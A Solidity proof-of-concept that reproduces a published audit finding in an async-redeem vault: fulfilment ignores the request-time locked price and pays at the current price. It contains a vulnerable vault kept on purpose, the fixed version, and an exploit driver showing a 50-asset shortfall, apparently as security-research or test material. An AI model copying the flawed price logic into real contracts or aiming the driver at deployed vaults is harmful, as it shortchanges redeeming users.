// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Accountable finding 62972:
// "AccountableAsyncRedeemVault::fulfillRedeemRequest ignores processingMode and
//  directly uses currentPrice for finalizing a redeem request".
//
// When processingMode == RequestPrice, the async-redeem queue guarantees that the
// assets a user receives are computed at the share price LOCKED AT REQUEST TIME
// (stored in request.sharePrice). Every queue function honours that stored price
// — except fulfillRedeemRequest, which passes the CURRENT sharePrice() into
// _fulfillRedeemRequest. If the share price falls between request and fulfilment,
// the user is finalized at the lower current price and receives fewer assets than
// the RequestPrice guarantee promised; the shortfall stays retained in the vault
// (i.e. accrues to the remaining holders).
//
// SOURCE PROVENANCE: the audited repo Accountable-Protocol/credit-vaults-internal
// returns "Repository not found" (private/dead). The vulnerable function body and
// the recommended fix are reproduced VERBATIM from the Cyfrin finding
// (2025-10-16-cyfrin-accountable-v2.0). The surrounding async-redeem queue
// (requestRedeem / _fulfillRedeemRequest / _reduce / sharePrice / claim) is the
// minimal faithful reconstruction needed to exercise that exact line — the
// wrong-vs-right price source (sharePrice() vs _queue.requests[id].sharePrice) is
// unambiguous from the fix diff. The finding was later resolved by removing
// processingMode entirely (commit 4e5eef5); this builds the audited PRE-FIX state.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double for the vault's opaque underlying asset and for the
///      harm marker token. Not the vulnerable boundary.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Shared async-redeem queue skeleton (reconstructed from the finding prose + the
// fix diff). Both the VULNERABLE and FIXED vaults inherit it so that the ONLY
// difference between them is the exact price source fulfillRedeemRequest passes.
// ─────────────────────────────────────────────────────────────────────────────
abstract contract AccountableAsyncRedeemVaultBase {
    // The finding's two processing modes.
    enum ProcessingMode {
        CurrentPrice,
        RequestPrice
    }

    struct RedeemRequest {
        address controller;
        uint256 shares;
        uint256 sharePrice; // price LOCKED at request time (RequestPrice guarantee)
        bool fulfilled;
    }

    // The withdrawal queue: request id -> request. Mirrors _queue.requests[id].
    struct WithdrawalQueue {
        mapping(uint128 => RedeemRequest) requests;
    }

    MiniToken public asset;
    address public operator;
    ProcessingMode public processingMode;

    uint256 internal _currentSharePrice; // 1e18-scaled: assets per share
    uint128 internal _nextRequestId;

    WithdrawalQueue internal _queue;
    mapping(address => uint128) internal _requestIds;

    mapping(address => uint256) public pendingShares;   // shares escrowed by a controller
    mapping(address => uint256) public claimableAssets;  // assets owed after fulfilment

    uint256 internal constant WAD = 1e18;

    constructor(address _asset, address _operator) {
        asset = MiniToken(_asset);
        operator = _operator;
    }

    modifier onlyOperatorOrStrategy() {
        require(msg.sender == operator, "not operator/strategy");
        _;
    }

    // --- price surface (settable double for an external NAV/oracle) ---
    function sharePrice() public view returns (uint256) {
        return _currentSharePrice;
    }

    function setSharePrice(uint256 price) external {
        _currentSharePrice = price;
    }

    function setProcessingMode(ProcessingMode mode) external {
        processingMode = mode;
    }

    // --- request: lock shares and, under RequestPrice, snapshot the price ---
    function requestRedeem(uint256 shares) external returns (uint128 requestId) {
        requestId = ++_nextRequestId;
        _requestIds[msg.sender] = requestId;

        // RequestPrice guarantee: the price at request time is stored for later use.
        uint256 lockedPrice = sharePrice();

        _queue.requests[requestId] = RedeemRequest({
            controller: msg.sender,
            shares: shares,
            sharePrice: lockedPrice,
            fulfilled: false
        });
        pendingShares[msg.sender] += shares;
    }

    // --- internal finalisation: assets = shares * price / WAD ---
    function _fulfillRedeemRequest(uint128 requestId, address controller, uint256 shares, uint256 price) internal {
        RedeemRequest storage req = _queue.requests[requestId];
        uint256 assets = shares * price / WAD;
        claimableAssets[controller] += assets;
        req.fulfilled = true;
    }

    function _reduce(address controller, uint256 shares) internal {
        pendingShares[controller] -= shares;
    }

    // --- claim: pay out the finalized assets ---
    function claim() external returns (uint256 assets) {
        assets = claimableAssets[msg.sender];
        claimableAssets[msg.sender] = 0;
        asset.transfer(msg.sender, assets);
    }

    // The subject of the finding — implemented by each variant.
    function fulfillRedeemRequest(address controller, uint256 shares) public virtual;

    // Helper for reading a stored request's locked price (assertions / clarity).
    function requestSharePrice(address controller) external view returns (uint256) {
        return _queue.requests[_requestIds[controller]].sharePrice;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE vault. fulfillRedeemRequest body is VERBATIM from the finding:
// it passes sharePrice() (the CURRENT price) instead of the stored request price.
// ─────────────────────────────────────────────────────────────────────────────
contract AccountableAsyncRedeemVault is AccountableAsyncRedeemVaultBase {
    constructor(address _asset, address _operator) AccountableAsyncRedeemVaultBase(_asset, _operator) {}

    function fulfillRedeemRequest(address controller, uint256 shares) public override onlyOperatorOrStrategy {
        _fulfillRedeemRequest(_requestIds[controller], controller, shares, sharePrice()); // @> ignores processingMode==RequestPrice: uses CURRENT sharePrice() not stored request.sharePrice
        _reduce(controller, shares);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED vault. fulfillRedeemRequest body is the finding's Recommended Mitigation:
// under RequestPrice it reads the LOCKED price from _queue.requests[id].sharePrice.
// ─────────────────────────────────────────────────────────────────────────────
contract AccountableAsyncRedeemVaultFixed is AccountableAsyncRedeemVaultBase {
    constructor(address _asset, address _operator) AccountableAsyncRedeemVaultBase(_asset, _operator) {}

    function fulfillRedeemRequest(address controller, uint256 shares) public override onlyOperatorOrStrategy {
        uint256 price;
        if (processingMode == ProcessingMode.CurrentPrice) {
            price = sharePrice();
        } else {
            uint128 requestId = _requestIds[controller];
            price = _queue.requests[requestId].sharePrice;
        }
        _fulfillRedeemRequest(_requestIds[controller], controller, shares, price);
        _reduce(controller, shares);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. Under RequestPrice mode a controller locks a redeem at price
// 1e18 (guaranteed 100 assets). The share price falls to 0.5e18 before the
// operator fulfils. The buggy fulfillRedeemRequest finalizes at the current
// 0.5e18, so the controller can only claim 50 assets — 50 short of the locked
// guarantee. The 50-asset shortfall stays retained in the vault. The Exploit
// plays both controller and operator (distinct roles that coincide here; the bug
// is purely the price source and is unaffected). Harm is recorded on a MARKER
// token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant SHARES = 100e18;
    uint256 internal constant PRICE_AT_REQUEST = 1e18;   // 1.0 asset / share
    uint256 internal constant PRICE_AT_FULFILL = 5e17;   // 0.5 asset / share

    // Exposed results for the driver.
    uint256 public guaranteedAssets;  // 100e18 (locked at request)
    uint256 public receivedAssets;    // 50e18  (buggy fulfilment at current price)
    uint256 public shortfall;         // 50e18
    uint256 public strandedInVault;   // 50e18  (shortfall retained by the vault)
    uint256 public sinkMarkerBalance; // 50e18
    address public vaultAddr;
    address public markerAddr;
    address public assetAddr;

    function run() external payable {
        // --- deploy, fixed order (marker LAST) ---
        MiniToken assetToken = new MiniToken("Vault Asset", "AST");                 // nonce 1
        AccountableAsyncRedeemVault vault = new AccountableAsyncRedeemVault(address(assetToken), address(this)); // nonce 2
        MiniToken marker = new MiniToken("Marker", "LOCKED-ASSET");                 // nonce 3 (LAST)

        vaultAddr = address(vault);
        markerAddr = address(marker);
        assetAddr = address(assetToken);

        // Fund the vault with the FULL guaranteed payout (100 assets).
        guaranteedAssets = SHARES * PRICE_AT_REQUEST / 1e18; // 100e18
        assetToken.mint(address(vault), guaranteedAssets);

        // Configure RequestPrice mode and the price at request time.
        vault.setProcessingMode(AccountableAsyncRedeemVaultBase.ProcessingMode.RequestPrice);
        vault.setSharePrice(PRICE_AT_REQUEST);

        // Controller (this Exploit) requests the redeem -> locks price 1e18.
        vault.requestRedeem(SHARES);

        // Share price falls before the operator processes the request.
        vault.setSharePrice(PRICE_AT_FULFILL);

        // Operator (this Exploit) fulfils via the BUGGY path (uses current 0.5e18).
        vault.fulfillRedeemRequest(address(this), SHARES);

        // Controller claims the finalized (shorted) assets.
        receivedAssets = vault.claim(); // 50e18

        // --- harm: user shorted vs the price-locked guarantee ---
        shortfall = guaranteedAssets - receivedAssets;         // 50e18
        strandedInVault = assetToken.balanceOf(address(vault)); // 50e18 retained by the vault

        require(receivedAssets == 50e18, "expected 50 assets under buggy fulfilment");
        require(shortfall == 50e18, "expected 50-asset shortfall");
        require(strandedInVault == shortfall, "shortfall must remain in the vault");

        // Record the harm magnitude on the marker token to the SINK.
        marker.mint(SINK, shortfall);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
